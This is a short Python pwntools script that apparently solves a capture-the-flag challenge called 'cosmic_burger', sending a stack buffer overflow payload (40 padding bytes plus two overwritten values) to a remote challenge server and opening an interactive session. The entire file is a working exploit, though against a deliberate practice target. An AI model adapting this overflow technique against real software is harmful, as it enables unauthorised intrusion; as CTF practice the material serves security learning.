#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./cosmic_burger', checksec=False)

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it",13513)

    return r

def main():
    p = conn()
    sauce = 0xBEEF
    cheese = 0xF00D
    OFFSET = 40 #found on pwndbg

    payload = b'A'*OFFSET + p32(cheese) + p32(sauce)
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()
